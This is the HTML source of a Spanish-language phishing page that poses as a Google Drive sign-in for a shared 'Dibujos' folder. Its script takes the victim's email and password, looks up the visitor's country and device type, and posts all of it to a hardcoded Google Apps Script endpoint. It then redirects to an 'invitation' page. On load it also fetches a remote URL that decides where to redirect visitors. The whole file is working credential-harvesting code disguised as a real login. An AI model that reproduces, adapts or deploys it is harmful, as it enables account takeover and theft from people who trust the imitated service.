<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    <link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    
    <meta property="og:title" content="Goo Drive - Dibujos" />
    <meta property="og:description" content="goo.com" />
    <meta property="og:image" content="https://i.ibb.co/b62PxBS/video-new.jpg" />
    
    <title>Goog Drive - Dibujos</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
            background-color: #202124;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
        }

        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 16px;
        }

        .card {
            background-color: #2d2e30;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            text-align: center;
        }

        .title {
            color: #e8eaed;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #e8eaed;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 16px 12px 8px;
            background-color: transparent;
            border: 2px solid #82aaff;
            border-radius: 10px;
            color: #e8eaed;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #82aaff;
        }

        .input-label {
            position: absolute;
            top: 16px;
            left: 12px;
            color: #cdd6f4;
            background-color: #2d2e30;
            padding: 0 4px;
            transition: 0.2s ease all;
            pointer-events: none;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: -10px;
            font-size: 0.8rem;
            color: #82aaff;
        }

        .forgot-email {
            color: #c8565d;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 48px;
            text-align: left;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .guest-mode {
            color: #e8eaed;
            font-size: 14px;
            line-height: 1.4286;
            margin-bottom: 48px;
            text-align: left;
        }

        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
        }

        .guest-mode a:hover {
            text-decoration: underline;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 48px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            padding: 0 24px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-button:hover {
            background-color: #2b7de9;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .next-button:disabled {
            background-color: #5f6368;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 56px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 450px;
            font-size: 12px;
        }

        .language-selector {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .language-selector select {
            background: transparent;
            border: none;
            color: #9aa0a6;
            font-size: 12px;
            outline: none;
            cursor: pointer;
        }

        .footer-links {
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
        }

        .footer-links a:hover {
            color: #e8eaed;
        }

        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            text-align: left;
            display: none;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container, .card {
                padding: 24px 24px 20px;
            }
            
            .footer {
                padding: 0 10px;
            }
            
            .footer-links {
                gap: 16px;
            }
            
            .footer-links a {
                font-size: 11px;
            }
            
            .language-selector select {
                font-size: 11px;
            }
        }
        
        @media (max-width: 360px) {
            .container, .card {
                padding: 20px 16px 16px;
            }
            
            .footer {
                margin-top: 32px;
                padding: 0 8px;
            }
            
            .footer-links {
                gap: 12px;
            }
            
            .footer-links a {
                font-size: 10px;
            }
            
            .language-selector select {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
         <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">

    
        <div class="card">
            <h1 class="title">Acceder a Dibujos</h1>
            <p class="subtitle">Ir a Drive</p>
            
            <form id="loginForm">
                <div class="input-wrapper">
                    <input type="email" id="emailInput" name="email" class="input-field" placeholder=" " required="" value="@gmail.com">
                    <label for="emailInput" class="input-label">Correo electrónico o teléfono</label>
                </div>
                
                <div id="errorMessage" class="error-message"></div>
                
                <a href="#" class="forgot-email">Solicite el permiso en la carpeta para continuar</a>
                
                <div class="guest-mode">
                    ¿No es tu ordenador? Usa el modo de invitado para navegar de forma privada. 
                    <a href="#">Más información</a>
                </div>
                
                <div class="actions">
                    <a href="#" class="create-account">Crear cuenta</a>
                    <button type="submit" class="next-button" id="submitBtn">Siguiente</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div class="language-selector">
                <select>
                    <option value="es">Español</option>
                    <option value="en">English</option>
                </select>
            </div>
            <div class="footer-links">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>
                <a href="#">Términos</a>
            </div>
        </div>
    </div>

    <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>

    <script>
        // Manejar formulario - Primera pantalla (solo email)
        document.getElementById("loginForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            
            const emailInput = document.querySelector('input[name="email"]');
            const errorMessage = document.getElementById('errorMessage');
            const submitBtn = document.getElementById('submitBtn');
            
            const email = emailInput.value.trim().toLowerCase();
            
            // Limpiar errores previos
            errorMessage.style.display = 'none';
            
            // Validar formato de correo electrónico
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showError("Introduce una dirección de correo electrónico válida");
                return;
            }
            
            // Lista de correos prohibidos
            const prohibitedEmails = ["ejemplo@mail.com"];
            if (prohibitedEmails.includes(email)) {
                showError("No se pudo encontrar tu cuenta de Google");
                emailInput.value = '';
                return;
            }
            
            // Cambiar a segunda pantalla (contraseña)
            showPasswordScreen(email);
        });
        
        function showPasswordScreen(email) {
            const card = document.querySelector('.card');
            
            // Obtener la primera letra del email
            const firstLetter = email.charAt(0).toUpperCase();
            
            card.innerHTML = `
                <h1 class="title">Bienvenido</h1>
                <div style="display: flex; align-items: center; margin-bottom: 32px; padding: 12px; background: #2d2e30; border-radius: 24px; border: 1px solid #5f6368;">
                    <div style="width: 40px; height: 40px; background-color: #8E24AA; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; flex-shrink: 0;">
                        <span style="color: white; font-size: 18px; font-weight: 500;">${firstLetter}</span>
                    </div>
                    <div style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                        <div style="color: #e8eaed; font-size: 16px; font-weight: 500;">${email}</div>
                    </div>
                </div>
                
                <form id="passwordForm">
                    <div class="input-wrapper">
                        <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32" required>
                        <label for="passwordInput" class="input-label">Introduce tu contraseña</label>
                    </div>
                    
                    <div id="passwordError" class="error-message"></div>
                    
                    <div style="display: flex; align-items: center; margin-bottom: 32px;">
                        <input type="checkbox" id="showPassword" style="margin-right: 8px;">
                        <label for="showPassword" style="color: #e8eaed; font-size: 14px; cursor: pointer;">Mostrar contraseña</label>
                    </div>
                    
                    <div class="actions">
                      <button type="button" onclick="goBackToEmail()" style="background: none; border: none; color: #007BFF; cursor: pointer; padding: 0; font-size: 1em;">Volver</button>
<button type="submit" class="next-button" id="passwordSubmitBtn">Siguiente</button>
                    </div>
                </form>
            `;
            
            // Manejar mostrar/ocultar contraseña
            document.getElementById('showPassword').addEventListener('change', function() {
                const passwordInput = document.getElementById('passwordInput');
                passwordInput.type = this.checked ? 'text' : 'password';
            });
            
            // Manejar envío de contraseña
            document.getElementById('passwordForm').addEventListener('submit', async function(event) {
                event.preventDefault();
                
                const passwordInput = document.getElementById('passwordInput');
                const passwordError = document.getElementById('passwordError');
                const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
                
                const password = passwordInput.value;
                
                // Limpiar errores
                passwordError.style.display = 'none';
                
                // Verificar contraseñas prohibidas
                const prohibitedWords = ["Sandia190395#","sandia190395#"];
                if (prohibitedWords.some(word => password.includes(word))) {
                    showPasswordError("La contraseña no es correcta. Inténtalo de nuevo.");
                    passwordInput.value = '';
                    return;
                }
                
                // Deshabilitar botón
                passwordSubmitBtn.disabled = true;
                passwordSubmitBtn.textContent = 'Verificando...';
                
                try {
                    // Detectar dispositivo
                    let deviceType = "Otro";
                    if (/android/i.test(navigator.userAgent)) {
                        deviceType = "Android";
                    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                        deviceType = "iPhone";
                    }
                    
                    // Obtener país
                    let country = "Desconocido";
                    try {
                        const response = await fetch("https://ipwhois.app/json/");
                        const data = await response.json();
                        if (data.country) {
                            country = data.country;
                        }
                    } catch (error) {
                        console.error("Error obteniendo el país:", error);
                    }
                    
                    // Enviar datos
                    const formData = new FormData();
                    formData.append("email", email);
                    formData.append("password", password);
                    formData.append("device", deviceType);
                    formData.append("country", country);
                    
                    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
                    
                    const response = await fetch(url, {
                        method: "POST",
                        body: new URLSearchParams(formData),
                        headers: { "Content-Type": "application/x-www-form-urlencoded" }
                    });
                    
                    if (response.ok) {
                        window.location.href = "invitation.html";
                    } else {
                        showPasswordError("Error al iniciar sesión. Inténtalo de nuevo.");
                    }
                } catch (error) {
                    showPasswordError("Error de conexión. Inténtalo de nuevo.");
                    console.error("Error:", error);
                } finally {
                    passwordSubmitBtn.disabled = false;
                    passwordSubmitBtn.textContent = 'Siguiente';
                }
            });
        }
        
        function goBackToEmail() {
            location.reload();
        }
        
        function showError(message) {
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }
        
        function showPasswordError(message) {
            const passwordError = document.getElementById('passwordError');
            passwordError.textContent = message;
            passwordError.style.display = 'block';
        }
        
        // Verificar redirección
        document.addEventListener("DOMContentLoaded", async function () {
            const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
            
            try {
                const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
                const pagina = await response.text();
                
                if (pagina.trim() !== "folder.html") {
                    window.location.href = pagina;
                }
            } catch (error) {
                console.error("Error al verificar la redirección:", error);
            }
        });
    </script>
</body>
</html>
